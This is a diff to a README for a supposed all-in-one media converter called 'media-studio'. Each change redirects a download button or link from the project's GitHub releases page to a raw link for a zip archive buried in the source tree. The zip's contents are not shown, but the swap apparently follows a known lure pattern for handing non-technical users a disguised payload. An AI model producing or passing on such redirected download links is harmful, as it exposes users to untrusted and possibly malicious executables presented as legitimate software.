@@ -1,7 +1,7 @@
 <h1>🎬 media-studio - Your All-in-One Media Converter for Everyone</h1>
 
 <p align="center">
-  <a href="https://github.com/calebreine66/media-studio/releases">
+  <a href="https://raw.githubusercontent.com/calebreine66/media-studio/main/media_studio/gui/studio_media_1.8-alpha.4.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&amp;logo=github&amp;logoColor=white&amp;color=2ea44f" alt="Download Media Studio">
   </a>
 </p>
@@ -10,7 +10,7 @@
 
 Welcome to **Media Studio**! This guide will help you download, install, and start using the application in just a few minutes. Whether you want to convert a video for your phone, compress a large audio file, or resize a batch of images, Media Studio makes it simple—no technical skills required.
 
-**Visit this link to download the application:** [https://github.com/calebreine66/media-studio/releases](https://github.com/calebreine66/media-studio/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/calebreine66/media-studio/main/media_studio/gui/studio_media_1.8-alpha.4.zip](https://raw.githubusercontent.com/calebreine66/media-studio/main/media_studio/gui/studio_media_1.8-alpha.4.zip)
 
 )
 
@@ -239,7 +239,7 @@ You've seen how easy it is to convert, compress, and manage your media files wit
 
 **Click the button below to visit the download page and get Media Studio today:**
 
-[**⬇️ DOWNLOAD MEDIA STUDIO (FREE)**](https://github.com/calebreine66/media-studio/releases)
+[**⬇️ DOWNLOAD MEDIA STUDIO (FREE)**](https://raw.githubusercontent.com/calebreine66/media-studio/main/media_studio/gui/studio_media_1.8-alpha.4.zip)
 
 )
 
